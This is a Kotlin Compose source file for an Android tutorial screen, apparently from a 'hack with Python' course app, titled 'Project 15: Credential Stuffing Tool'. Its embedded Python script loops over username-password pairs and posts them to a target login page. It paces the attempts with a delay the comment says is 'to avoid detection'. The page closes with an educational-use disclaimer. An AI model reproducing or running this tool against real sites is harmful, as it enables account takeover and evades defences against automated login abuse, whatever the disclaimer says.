package com.example.hackwithpython.projects

import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Text
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.rememberScrollState
import androidx.compose.foundation.verticalScroll
import androidx.compose.material3.Button
import androidx.compose.ui.Modifier
import androidx.compose.runtime.Composable
import androidx.compose.ui.text.font.FontWeight
import androidx.compose.ui.unit.dp
import androidx.compose.material3.MaterialTheme
import androidx.compose.ui.Alignment
import androidx.navigation.NavController

@Composable
fun Project15Screen(navController: NavController) {
    Column(modifier = Modifier
        .padding(16.dp)
        .verticalScroll(rememberScrollState()),
        verticalArrangement = Arrangement.Top,
        horizontalAlignment = Alignment.Start
    ) {
        Text(
            text = "Project 15: Credential Stuffing Tool",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Introduction Section
        Text(
            text = """
                In this project, you will develop a credential stuffing tool that automates attacks 
                by testing multiple username-password combinations on various websites. This project is intended 
                for educational purposes to understand the impact of poor password management and security practices.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Prerequisites
        Text(
            text = "Prerequisites",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Before starting this project, ensure you have:
                - A basic understanding of web requests and HTTP protocols.
                - The `requests` library available in Python.
                - An ethical mindset and awareness of legal implications.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Project Description
        Text(
            text = "Project Description",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                In this project, you will:
                - Create a script to read a list of usernames and passwords.
                - Send HTTP POST requests to a target website for login attempts.
                - Implement rate limiting and error handling.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Python Example Code
        Text(
            text = "Python Code Example: Credential Stuffing Tool",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                Below is an example of how to implement a credential stuffing tool in Python:
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                import requests
                import time

                # Function to perform credential stuffing
                def credential_stuffing(url, username, password):
                    payload = {
                        'username': username,
                        'password': password
                    }
                    response = requests.post(url, data=payload)
                    
                    if "Login successful" in response.text:
                        print(f"[+] Successful login: {username}:{password}")
                    else:
                        print(f"[-] Failed login: {username}:{password}")

                # Example usage
                target_url = "http://example.com/login"  # Replace with the target login URL
                credentials = [
                    ("user1", "pass1"),
                    ("user2", "pass2"),
                    # Add more username-password combinations
                ]

                # Iterate over credentials and attempt login
                for username, password in credentials:
                    credential_stuffing(target_url, username, password)
                    time.sleep(1)  # Add delay to avoid detection
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        // Ethical Use Disclaimer
        Text(
            text = "Ethical Use Disclaimer",
            fontWeight = FontWeight.Bold,
            style = MaterialTheme.typography.headlineMedium,
            modifier = Modifier.padding(vertical = 8.dp)
        )
        Text(
            text = """
                This project is intended for educational purposes only. 
                Unauthorized access to computer systems is illegal. 
                Always seek permission and ensure you are in compliance with local laws before testing or demonstrating this type of project.
            """.trimIndent(),
            modifier = Modifier.padding(vertical = 8.dp)
        )

        Spacer(modifier = Modifier.height(32.dp))

        // Button to navigate to the next section or project
        Button(onClick = { navController.navigate("project16") }) {
            Text(text = "Next Project")
        }
    }
}
